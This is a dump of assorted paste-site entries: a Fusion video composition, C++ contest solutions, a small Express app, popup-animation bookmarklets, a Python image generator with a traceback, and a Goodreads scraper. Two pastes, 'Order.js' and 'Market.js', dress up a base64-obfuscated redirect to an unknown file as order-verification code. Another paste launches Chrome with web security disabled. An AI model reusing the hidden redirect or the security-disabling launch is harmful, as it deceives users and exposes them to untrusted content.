				FilmGate = Input { Value = FuID { ""BMD_URSA_4K_16x9"" }, },
				[""SurfacePlaneInputs.ObjectID.ObjectID""] = Input { Value = 8, },
				[""MtlStdInputs.MaterialID""] = Input { Value = 10, }
			},
			ViewInfo = OperatorInfo { Pos = { 2750, 2458.5 } },
		},
		pEmitter3 = pEmitter {
			ID = 94466,
			Inputs = {
				Number = Input {
					Value = 0,
					Expression = ""time>0 and 0 or 10000"",
				},
				Lifespan = Input { Value = 1000, },
				PositionVariance = Input { Value = 0.1, },
				RotationControls = Input { Value = 1, },
				SpinControls = Input { Value = 1, },
				SpinZVariance = Input { Value = 2, },
				Style = Input { Value = FuID { ""ParticleStyleBitmap"" }, },
				[""ParticleStyleBitmap.DropToolsHere""] = Input {
					SourceOp = ""BrightnessContrast25"",
					Source = ""Output"",
				},
				Region = Input { Value = FuID { ""MeshRegion"" }, },
				[""MeshRegion.MeshInput""] = Input {
					SourceOp = ""Text3D1"",
					Source = ""Output"",
				},
				[""ParticleStyle.SizeControls""] = Input { Value = 1, },
				[""ParticleStyle.SizeVariance""] = Input { Value = 0.1, },
				[""ParticleStyle.SizeOverLife""] = Input {
					SourceOp = ""pEmitter3SizeOverLife"",
					Source = ""Value"",
				},
				[""ParticleStyle.BlurOverLife""] = Input {
					SourceOp = ""pEmitter3BlurOverLife2D"",
					Source = ""Value"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 2750, 2359.5 } },
		},
		pEmitter3SizeOverLife = LUTBezier {
			KeyColorSplines = {
				[0] = {
					[0] = { 0.5, RH = { 0.3, 0.5 }, Flags = { Linear = true } },
					[1] = { 0.5, LH = { 0.7, 0.5 }, Flags = { Linear = true } }
				}
			},
			SplineColor = { Red = 192, Green = 128, Blue = 64 },
			CtrlWZoom = false,
		},
		pEmitter3BlurOverLife2D = LUTBezier {
			KeyColorSplines = {
				[0] = {
					[0] = { 0.5, RH = { 0.3, 0.5 }, Flags = { Linear = true } },
					[1] = { 0.5, LH = { 0.7, 0.5 }, Flags = { Linear = true } }
				}
			},
			SplineColor = { Red = 0, Green = 0, Blue = 0 },
			CtrlWZoom = false,
			NameSet = true,
		},
		AmbientLight1 = LightAmbient {
			Inputs = {
				[""Transform3DOp.Translate.X""] = Input { Value = 0.455294157967599, },
				[""Transform3DOp.Translate.Y""] = Input { Value = -0.291437834636187, },
				[""Transform3DOp.Translate.Z""] = Input { Value = -0.00391906766161974, },
				Intensity = Input { Value = 0.543, }
			},
			ViewInfo = OperatorInfo { Pos = { 3025, 2392.5 } },
		},
		Text3D1 = Text3D {
			Inputs = {
				LayoutRotation = Input { Value = 1, },
				SelectTransform = Input { Value = 2, },
				LineSpacing = Input { Value = 0.756, },
				CharacterSpacing = Input { Value = 1.2, },
				TransformRotation = Input { Value = 1, },
				StyledText = Input { Value = ""Just\n  Crop\nIt"", },
				Font = Input { Value = ""Open Sans"", },
				Style = Input { Value = ""Light"", },
				VerticalTopCenterBottom = Input { Value = 1, },
				VerticalJustification = Input { Value = 3, },
				VerticalJustificationNew = Input { Value = 3, },
				HorizontalJustificationNew = Input { Value = 3, },
				Extrusion = Input { Value = 1, },
				ExtrusionStyle = Input { Value = 1, },
				ExtrusionProfile = Input {
					SourceOp = ""Text3D1ExtrusionProfile"",
					Source = ""Value"",
				},
				ExtrusionDepth = Input { Value = 0.2, },
				BevelDepth = Input { Value = 0.1024, },
				BevelWidth = Input { Value = 0.078, },
				SmoothingAngle = Input { Value = 32.13, }
			},
			ViewInfo = OperatorInfo { Pos = { 2750, 2293.5 } },
		},
		Text3D1ExtrusionProfile = LUTBezier {
			KeyColorSplines = {
				[0] = {
					[0] = { 0, RH = { 0, 0.26445323888865 }, Flags = { Linear = true } },
					[0.114438502673797] = { 0.6, LH = { 0.0762961507548036, 0.526942507886193 }, RH = { 0.187167664731559, 0.739304733875964 } },
					[0.502399481745327] = { 1, LH = { 0.373079155388151, 1 }, RH = { 0.610512310468364, 1 } },
					[0.826737967914439] = { 0.740740740740741, LH = { 0.77763696960193, 0.837348575824786 }, RH = { 0.884486199566936, 0.627119188600965 } },
					[1] = { 0, LH = { 1, 0.323806549826305 } }
				}
			},
			SplineColor = { Red = 192, Green = 128, Blue = 64 },
			CtrlWZoom = false,
		},
		pRender3 = pRender {
			Inputs = {
				_MotionBlurWarning = Input { Disabled = true, },
				GlobalOut = Input { Value = 983, },
				Width = Input { Value = 1080, },
				Height = Input { Value = 1080, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				OutputMode = Input { Disabled = true, },
				[""MaterialID.MaterialID""] = Input { Value = 8, },
				[""ObjectID.ObjectID""] = Input { Value = 7, },
				Input = Input {
					SourceOp = ""pEmitter3"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 2750, 2392.5 } },
		},
		Merge3D3 = Merge3D {
			Inputs = {
				[""Transform3DOp.Translate.Y""] = Input { Value = -0.296, },
				[""Transform3DOp.Rotate.Y""] = Input {
					Value = 88,
					Expression = ""time*2"",
				},
				SceneInput1 = Input {
					SourceOp = ""pRender3"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 2750, 2425.5 } },
		},
		Merge3D2 = Merge3D {
			Inputs = {
				SceneInput1 = Input {
					SourceOp = ""Merge3D3"",
					Source = ""Output"",
				},
				SceneInput2 = Input {
					SourceOp = ""Camera3D2"",
					Source = ""Output"",
				},
				SceneInput3 = Input {
					SourceOp = ""SpotLight1"",
					Source = ""Output"",
				},
				SceneInput4 = Input {
					SourceOp = ""AmbientLight1"",
					Source = ""Output"",
				},
				SceneInput5 = Input {
					SourceOp = ""SpotLight1_1"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 2860, 2458.5 } },
		},
		SpotLight1_1 = LightSpot {
			Inputs = {
				[""Transform3DOp.Translate.X""] = Input { Value = -0.238070836184698, },
				[""Transform3DOp.Translate.Y""] = Input { Value = 1.653, },
				[""Transform3DOp.Translate.Z""] = Input { Value = 7.58, },
				[""Transform3DOp.UseTarget""] = Input { Value = 1, },
				[""Transform3DOp.Target.X""] = Input { Value = -0.690234629217646, },
				Intensity = Input { Value = 0.15, },
				ConeAngle = Input { Value = 88.58, },
				PenumbraAngle = Input { Value = 2.36, },
				[""ShadowLightInputs3D.Nest""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowsEnabled""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowColorRed""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowColorGreen""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowColorBlue""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowMapSize""] = Input { Value = 2048, }
			},
			ViewInfo = OperatorInfo { Pos = { 3025, 2458.5 } },
		},
		SpotLight1 = LightSpot {
			Inputs = {
				[""Transform3DOp.Translate.X""] = Input { Value = 0.674142352588237, },
				[""Transform3DOp.Translate.Y""] = Input { Value = 3.37108805649589, },
				[""Transform3DOp.Translate.Z""] = Input { Value = 2.48776958228623, },
				[""Transform3DOp.UseTarget""] = Input { Value = 1, },
				[""Transform3DOp.Target.X""] = Input { Value = 0.753580522103758, },
				Intensity = Input { Value = 0.8, },
				ConeAngle = Input { Value = 53.15, },
				PenumbraAngle = Input { Value = 6.77, },
				Dropoff = Input { Value = 0, },
				[""ShadowLightInputs3D.Nest""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowsEnabled""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowColorRed""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowColorGreen""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowColorBlue""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowDensity""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowMapSize""] = Input { Value = 2048, },
				[""ShadowLightInputs3D.MultiplicativeBias""] = Input { Value = 30, },
				[""ShadowLightInputs3D.AdditiveBias""] = Input { Value = 30, }
			},
			ViewInfo = OperatorInfo { Pos = { 3025, 2425.5 } },
		},
		BrightnessContrast25 = BrightnessContrast {
			Inputs = {
				Alpha = Input { Value = 1, },
				Gain = Input { Value = 0.15, },
				Input = Input {
					SourceOp = ""FastNoise1_7"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 2860, 2326.5 } },
		},
		FastNoise1_7 = FastNoise {
			Inputs = {
				GlobalOut = Input { Value = 983, },
				Width = Input { Value = 256, },
				Height = Input { Value = 256, },
				Depth = Input { Value = 4, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				XScale = Input { Value = 10, },
				SeetheRate = Input { Value = 0.669, },
				Type = Input { Value = 1, },
				GradientType = Input { Value = 5, },
				Start = Input { Value = { 0.5, 0.5 }, },
				Gradient = Input {
					Value = Gradient {
						Colors = {
							[0] = { 1, 1, 1, 1 },
							[0.667] = { 0, 0, 0, 0 }
						}
					},
				}
			},
			ViewInfo = OperatorInfo { Pos = { 2860, 2293.5 } },
		},
		Renderer3D2 = Renderer3D {
			CustomData = {
				ToolVersion = 2,
			},
			Inputs = {
				GlobalOut = Input { Value = 983, },
				Width = Input { Value = 1080, },
				Height = Input { Value = 1080, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				SceneInput = Input {
					SourceOp = ""Merge3D2"",
					Source = ""Output"",
				},
				[""RendererSoftware.Channels.Nest""] = Input { Value = 1, },
				[""RendererSoftware.LightingEnabled""] = Input { Value = 1, },
				[""RendererSoftware.ShadowsEnabled""] = Input { Value = 1, },
				[""RendererOpenGL.Channels.Nest""] = Input { Value = 1, },
				[""RendererOpenGL.AntiAliasing.Channels.RGBA.HighQuality.Enable""] = Input { Value = 1, },
				[""RendererOpenGL.AntiAliasing.Presets.Color.Supersampling.HighQuality.Rate""] = Input { Value = 3, },
				[""RendererOpenGL.AntiAliasing.Presets.Color.Multisampling.LowQuality.SampleCount""] = Input { Value = 2, },
				[""RendererOpenGL.AntiAliasing.Presets.Color.Multisampling.HighQuality.SampleCount""] = Input { Value = 3, },
				[""RendererOpenGL.AntiAliasing.Presets.Aux.Supersampling.HighQuality.Rate""] = Input { Value = 3, },
				[""RendererOpenGL.AntiAliasing.Presets.Aux.Multisampling.LowQuality.SampleCount""] = Input { Value = 2, },
				[""RendererOpenGL.AntiAliasing.Presets.Aux.Multisampling.HighQuality.SampleCount""] = Input { Value = 3, },
				[""RendererOpenGL.AccumQuality""] = Input { Value = 32, },
				[""RendererOpenGL.LightingEnabled""] = Input { Value = 1, },
				[""RendererOpenGL.ShadowsEnabled""] = Input { Value = 1, },
				[""RendererOpenGL.MaximumTextureDepth""] = Input { Value = 3, },
				[""RendererOpenGL.TransparencySorting""] = Input { Value = 1, }
			},
			ViewInfo = OperatorInfo { Pos = { 2860, 2491.5 } },
			SubInputsData = {
				RendererOpenGL = {
					Version = 1
				}
			}
		},
		BrightnessContrast24 = BrightnessContrast {
			Inputs = {
				Gamma = Input { Value = 0.45, },
				Input = Input {
					SourceOp = ""Background1_5"",
					Source = ""Output"",
				},
				EffectMask = Input {
					SourceOp = ""Ellipse6"",
					Source = ""Mask"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 2970, 2590.5 } },
		},
		Ellipse6 = EllipseMask {
			Inputs = {
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				SoftEdge = Input { Value = 0.6, },
				Invert = Input { Value = 1, },
				MaskWidth = Input { Value = 1080, },
				MaskHeight = Input { Value = 1080, },
				PixelAspect = Input { Value = { 1, 1 }, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				Center = Input { Value = { 0.307807807807808, 0.0843373493975904 }, },
				Width = Input { Value = 1.56965160099012, },
				Height = Input { Value = 1.56965160099012, }
			},
			ViewInfo = OperatorInfo { Pos = { 2970, 2557.5 } },
		},
		CameraShake1 = CameraShake {
			Inputs = {
				Randomness = Input { Value = 0.882, },
				OverallStrength = Input {
					SourceOp = ""CameraShake1OverallStrength"",
					Source = ""Value"",
				},
				Speed = Input { Value = 0.087, },
				FrequencyMethod = Input { Value = 1, },
				Input = Input {
					SourceOp = ""Renderer3D2"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 2860, 2557.5 } },
		},
		CameraShake1OverallStrength = BezierSpline {
			SplineColor = { Red = 207, Green = 239, Blue = 163 },
			CtrlWZoom = false,
			NameSet = true,
			KeyFrames = {
				[0] = { 0, RH = { 6.66666666666667, 0.0166666666666667 }, Flags = { Linear = true } },
				[20] = { 0.05, LH = { 13.3333333333333, 0.0333333333333333 }, RH = { 70, 0.05 }, Flags = { Linear = true } },
				[170] = { 0.05, LH = { 120, 0.05 }, RH = { 173.333333333333, 0.0333333333333333 }, Flags = { Linear = true } },
				[180] = { 0, LH = { 176.666666666667, 0.0166666666666667 }, Flags = { Linear = true } }
			}
		},
		Background1_5 = Background {
			NameSet = true,
			Inputs = {
				GlobalOut = Input { Value = 983, },
				Width = Input { Value = 1080, },
				Height = Input { Value = 1080, },
				Depth = Input { Value = 1, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				TopLeftRed = Input { Value = 0.62211, },
				TopLeftGreen = Input { Value = 0.76784216, },
				TopLeftBlue = Input { Value = 0.89, }
			},
			ViewInfo = OperatorInfo { Pos = { 3080, 2590.5 } },
		},
		Merge42 = Merge {
			CtrlWZoom = false,
			Inputs = {
				Background = Input {
					SourceOp = ""BrightnessContrast24"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""CameraShake1"",
					Source = ""Output"",
				},
				PerformDepthMerge = Input { Value = 0, }
			},
			ViewInfo = OperatorInfo { Pos = { 2860, 2623.5 } },
		}
	}
}"
QVMbwdNN,小球反弹 参考代码,Dmaxiya,C++,Tuesday 8th of April 2025 12:01:47 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif  // ExRoc
    ios::sync_with_stdio(false);

    LL x = 15 * 233333 * 2;
    LL y = 17 * 343720 * 2;
    LL g = __gcd(x, y);
    LL lcm = x / g * y;
    LL a = lcm / x;
    LL b = lcm / y;
    double ans = sqrt(233333 * a * 2 * 233333 * a * 2 + 343720 * b * 2 * 343720 * b * 2);
    printf(""%.2f\n"", ans);

    return 0;
}
"
veuWjN0L,Handlebars app 2,MCreeper12731,JavaScript,Tuesday 8th of April 2025 11:51:16 AM CDT,"import express from 'express';
import { dirname, join } from ""path"";
import { fileURLToPath } from ""url"";

const __dirname = dirname(fileURLToPath(import.meta.url));

const app = express();

app.set('view engine', 'hbs');
app.set('views', join(__dirname, 'views'));
app.use(express.static(join(__dirname, ""public"")));
app.use(express.urlencoded({ extended: true }));
    
app.get(""/"", (req, res) => {
    res.render(""index"", { title: ""Main Page"" })
});

app.get(""/breeds"", (req, res) => {
    res.render(""breeds"", { title: ""Cat Breeds"" })
});

app.get(""/adoption"", (req, res) => {
    res.render(""adoption"", { title: ""Adoption"" })
});



app.listen(3000, () => {
    console.log('Server is running at http://localhost:3000');
});"
LLeuZqXU,奇怪的数 参考代码,Dmaxiya,C++,Tuesday 8th of April 2025 11:20:33 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const LL MOD = 998244353;
const int maxn = 10;
int n, m;
LL ans;
LL dp[2][maxn][maxn][maxn][maxn];

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif  // ExRoc
    ios::sync_with_stdio(false);

    cin >> n >> m;
    for (int a = 1; a < 10; a += 2) {
        for (int b = 0; b < 10; b += 2) {
            for (int c = 1; c < 10; c += 2) {
                for (int d = 0; d < 10; d += 2) {
                    if (a + b + c + d <= m) {
                        dp[0][a][b][c][d] = 1;
                    }
                }
            }
        }
    }

    for (int i = 5; i <= n; ++i) {
        int nowi = (i % 2);
        int prei = nowi ^ 1;
        memset(dp[nowi], 0, sizeof(dp[nowi]));
        for (int e = nowi; e < 10; e += 2) {
            for (int d = nowi ^ 1; d < 10; d += 2) {
                for (int c = nowi; c < 10; c += 2) {
                    for (int b = nowi ^ 1; b < 10; b += 2) {
                        for (int a = nowi; a < 10; a += 2) {
                            if (a + b + c + d + e > m) {
                                continue;
                            }
                            dp[nowi][b][c][d][e] =
                                (dp[nowi][b][c][d][e] + dp[prei][a][b][c][d]) %
                                MOD;
                        }
                    }
                }
            }
        }
    }

    for (int a = 0; a < 10; ++a) {
        for (int b = 0; b < 10; ++b) {
            for (int c = 0; c < 10; ++c) {
                for (int d = 0; d < 10; ++d) {
                    ans = (ans + dp[n & 1][a][b][c][d]) % MOD;
                }
            }
        }
    }
    cout << ans << endl;

    return 0;
}
"
f3K4RNVB,Dancing Popup Javascripts,CCGameing,JavaScript,Tuesday 8th of April 2025 11:16:28 AM CDT,"/*  Fun Javascripts for your browser!
 *  Add these to your bookmarks ( RClick on Bookmark Bar > Add Page ) to run any time!
 */

// Name: Page Popup
javascript: var popup = window.open(location.href, '', ""width=300,height=300""); popup.moveTo(screen.availLeft + screen.availWidth/2 - 150, screen.availTop + screen.availHeight/2 - 150);

// Name: Popup Dance
// Note! This has to be pasted into the console of the popup ( CTRL + Shift + I > CTRL + V )
javascript: time = Math.PI/2; timeSin = 0; timeCos = 0; function dance() { time += 60/1000; timeSin = Math.sin(time) * 10; timeCos = Math.cos(time * 2) * 10; moveBy(timeSin, timeCos); requestAnimationFrame(dance)}; dance();

// Name: Popup Dance (Advanced)
// Note: This has to be run in a browser instance. File for this given below
// Note: Really just a combination of the two above but made easier to setup using injection
javascript: var popup = window.open(location.href, '', ""width=300,height=300""); popup.moveTo(screen.availLeft + screen.availWidth/2 - 150, screen.availTop + screen.availHeight/2 - 150); function inject() { var time = Math.PI/2; var timeSin = 0;var timeCos = 0;function dance() { time += 60/1000; timeSin = Math.sin(time) * 10; timeCos = Math.cos(time * 2) * 10; moveBy(timeSin, timeCos);requestAnimationFrame(dance); }; dance(); console.log(""Script Injected!""); }; var script = popup.document.createElement('script');script.innerHTML = '(' + inject.toString() + '());';popup.onload = function() { this.document.head.appendChild(script) }

// Name: Chrome Dev Mode.cmd
// Note: This is a command prompt to create a chrome instance where the above javascript works
start """" ""C:\Program Files\Google\Chrome\Application\chrome.exe"" --user-data-dir=""C:/Users/[username]/Documents/Projects/Testing/Chrome dev session"" --disable-web-security"
7ULcgM89,Untitled,Tranquility3,Python,Tuesday 8th of April 2025 11:12:55 AM CDT,"def generate_star_field(width, height, num_stars=1000):
    img = Image.new('RGB', (width, height), 'black')
    draw = ImageDraw.Draw(img)
    for _ in range(num_stars):
        x = random.randint(0, width)
        y = random.randint(0, height)
        brightness = random.randint(180, 255)
        size = random.choice([1, 2])
        draw.ellipse((x, y, x + size, y + size), fill=(brightness,) * 3)
    return img

def generate_fractal_noise(width, height, octaves=5, persistence=0.5):
    noise = np.zeros((height, width), dtype=np.float32)
    amp = 1
    total_amp = 0
    for _ in range(octaves):
        layer = np.random.rand(height, width)
        noise += layer * amp
        total_amp += amp
        amp *= persistence
    noise /= total_amp
    noise = (noise - noise.min()) / (noise.max() - noise.min())
    return noise

def generate_nebula_blob(width, height, color, alpha=0.9, blur=8):
    noise = generate_fractal_noise(width, height, octaves=6, persistence=0.5)
    x, y = np.meshgrid(np.linspace(-1, 1, width), np.linspace(-1, 1, height))
    d = np.sqrt(x * x + y * y)
    radial_falloff = np.exp(-d**2 * 3)
    combined = noise * radial_falloff
    combined = (combined - combined.min()) / (combined.max() - combined.min())
    mask_array = (combined * 255).astype(np.uint8)
    mask = Image.fromarray(mask_array).filter(ImageFilter.GaussianBlur(radius=blur))
    blob = Image.new(""RGBA"", (width, height), color + (0,))
    blob.putalpha(mask.point(lambda p: int(p * alpha)))
    return blob

def place_blob(base, blob, position, angle=0):
    rotated = blob.rotate(angle, expand=True)
    temp = Image.new(""RGBA"", base.size)
    px, py = position[0] - rotated.size[0] // 2, position[1] - rotated.size[1] // 2
    temp.paste(rotated, (px, py), rotated)
    return Image.alpha_composite(base, temp)

def generate_nebula_image(width, height):
    base = generate_star_field(width, height).convert(""RGBA"")
    colors = [
        (255, 100, 100),
        (100, 200, 255),
        (180, 100, 255),
        (255, 255, 120),
        (100, 255, 180),
    ]
    for _ in range(10):
        scale = random.uniform(0.8, 1.4)
        blob_size = int(width * scale), int(height * scale)
        color = random.choice(colors)
        blob = generate_nebula_blob(*blob_size, color, alpha=0.95)
        pos = (random.randint(0, width), random.randint(0, height))
        angle = random.randint(0, 360)
        base = place_blob(base, blob, pos, angle)

    base = ImageEnhance.Contrast(base).enhance(1.3)
    base = ImageEnhance.Brightness(base).enhance(1.2)
    # 🟢 FIX: return a proper RGB image
    rgb_image = base.convert(""RGB"")
    return rgb_image


async def create_system(self, system_id):
    system = self.bot.systems[system_id]
    # Get the editor object instead of a plain image
    c_width = 1920
    c_height = 1080
    img = generate_nebula_image(1920, 1080)
    print(type(img), img.mode)
    bg = await asyncio.to_thread(generate_nebula_image(c_width, c_height))
    
    editor = Editor(bg)

    # Example: Add a title
    font = Font.poppins(size=48, variant=""bold"")
    editor.text((c_width/2, 50), system.name, font=font, color=""white"", align = ""center"")

    # Example: Draw a glowing dot or overlay (custom UI)
    editor.ellipse((900, 600), width=20, height=20, color=Color(""cyan""))
    
    # Save to buffer
    buffer = BytesIO()
    await asyncio.to_thread(editor.image.save, buffer, format=""PNG"")
    buffer.seek(0)
    return buffer




Traceback error:
    Ignoring exception in command starfield:
Traceback (most recent call last):
  File ""/home/tranquility/Bots/Orion/lib/python3.9/site-packages/nextcord/application_command.py"", line 1053, in _call_with_hooks
    await callback(*args)
  File ""/home/tranquility/Bots/Orion/lib/python3.9/site-packages/nextcord/application_command.py"", line 1135, in call_invoke_slash
    await self.invoke_slash(interaction, **kwargs)
  File ""/home/tranquility/Bots/Orion/lib/python3.9/site-packages/nextcord/application_command.py"", line 1226, in invoke_slash
    await self.callback(self._self_argument, interaction, **kwargs)
  File ""/home/tranquility/Bots/Orion/cogs/misc.py"", line 146, in starfield
    buffer = await create_system(self, 0)
  File ""/home/tranquility/Bots/Orion/utils/solar_system.py"", line 92, in create_system
    bg = await asyncio.to_thread(generate_nebula_image(c_width, c_height))
  File ""/usr/lib/python3.9/asyncio/threads.py"", line 25, in to_thread
    return await loop.run_in_executor(None, func_call)
  File ""/usr/lib/python3.9/concurrent/futures/thread.py"", line 58, in run
    result = self.fn(*self.args, **self.kwargs)
TypeError: 'Image' object is not callable

The above exception was the direct cause of the following exception:

nextcord.errors.ApplicationInvokeError: Command raised an exception: TypeError: 'Image' object is not callable
"
6pNeJ7Sj,Order.js,SpawnKz,JavaScript,Tuesday 8th of April 2025 11:06:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66466/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5XR7jL2q,Market.js,SpawnKz,JavaScript,Tuesday 8th of April 2025 10:51:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56661/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4d5E2FXP,gr scrape good 2 only 200(sometimes 300),STANAANDREY,Python,Tuesday 8th of April 2025 10:42:18 AM CDT,"import requests
from bs4 import BeautifulSoup
import pandas as pd
import re
import time
import random

def scrape_goodreads_best_books(num_pages=3):
    all_books = []
    base_url = ""https://www.goodreads.com/list/show/1.Best_Books_Ever""
    
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
    ]
    
    for page in range(1, num_pages + 1):
        if page == 1:
            url = base_url
        else:
            url = f""{base_url}?page={page}""
        
        print(f""Scraping page {page}: {url}"")
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        }
        
        if page > 1:
            delay = random.uniform(2, 5)
            print(f""Waiting {delay:.2f} seconds before next request..."")
            time.sleep(delay)
        
        try:
            response = requests.get(url, headers=headers, timeout=30)
            print(f""Response status code: {response.status_code}"")
            
            if response.status_code != 200:
                print(f""Failed to retrieve page {page}. Stopping."")
                break
                
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check if we're being blocked
            title = soup.title.text if soup.title else ""No title found""
            if ""robot"" in title.lower() or ""captcha"" in title.lower() or ""blocked"" in title.lower():
                print(f""Detected anti-bot measures on page {page}. Stopping."")
                break
            
            # Find all book entries on the page
            book_elements = soup.select(""table.tableList tr"")
            print(f""Found {len(book_elements)} books on page {page}"")
            
            # Calculate base ranking for this page
            base_rank = (page - 1) * 100
            
            # Extract data for each book
            for i, book in enumerate(book_elements):
                try:
                    # Calculate ranking
                    rank = base_rank + i + 1
                    
                    # Extract title and URL
                    title_el = book.select_one("".bookTitle"")
                    title = title_el.text.strip() if title_el else ""Unknown Title""
                    
                    # Extract book URL for description fetching (won't be stored in DataFrame)
                    book_url = None
                    if title_el and title_el.get('href'):
                        book_url = f""https://www.goodreads.com{title_el.get('href')}""
                    
                    # Extract author
                    author_el = book.select_one("".authorName"")
                    author = author_el.text.strip() if author_el else ""Unknown Author""
                    
                    # Extract rating
                    rating_el = book.select_one("".minirating"")
                    rating_text = rating_el.text.strip() if rating_el else """"
                    rating_match = re.search(r'(\d+\.\d+)', rating_text)
                    avg_rating = float(rating_match.group(1)) if rating_match else None
                    
                    # Extract score - FIXED APPROACH
                    score = 0
                    
                    # Look for the score text (not people voted)
                    vote_elements = book.select("".uitext"")
                    for el in vote_elements:
                        text = el.text.strip()
                        # Look for ""score: X"" pattern
                        if ""score:"" in text.lower():
                            score_match = re.search(r'score:\s*([\d,]+)', text, re.IGNORECASE)
                            if score_match:
                                score = int(score_match.group(1).replace(',', ''))
                                break
                    
                    # If first book on first page, print debug info
                    if rank == 1:
                        print(""\nDEBUG INFO FOR FIRST BOOK:"")
                        print(f""Title: {title}"")
                        print(f""All text in book element: {book.text.strip()[:500]}"")
                        print(f""Vote elements found: {len(vote_elements)}"")
                        for idx, el in enumerate(vote_elements):
                            print(f""Vote element {idx}: {el.text.strip()}"")
                    
                    # Create book entry
                    book_data = {
                        ""rank"": rank,
                        ""title"": title,
                        ""author"": author,
                        ""avg_rating"": avg_rating,
                        ""score"": score,
                        ""temp_url"": book_url,  # Temporary field, will be removed later
                        ""description"": None  # Will be populated later
                    }
                    
                    all_books.append(book_data)
                    
                except Exception as e:
                    print(f""Error extracting book {i+1} on page {page}: {e}"")
            
        except Exception as e:
            print(f""Error processing page {page}: {e}"")
    
    print(f""Total books collected: {len(all_books)}"")
    return all_books

def get_book_description(book_url):
    """"""Fetch the book description from its detail page""""""
    if not book_url:
        return ""No description available""
    
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        }
        
        response = requests.get(book_url, headers=headers, timeout=30)
        
        if response.status_code != 200:
            return ""Failed to retrieve description""
            
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Try different selectors for description
        description_el = (
            soup.select_one(""#description span[style='display:none']"") or
            soup.select_one(""#description span"") or
            soup.select_one("".DetailsLayoutRightParagraph__widthConstrained"") or
            soup.select_one(""[data-testid='description']"") or
            soup.select_one(""#description"")
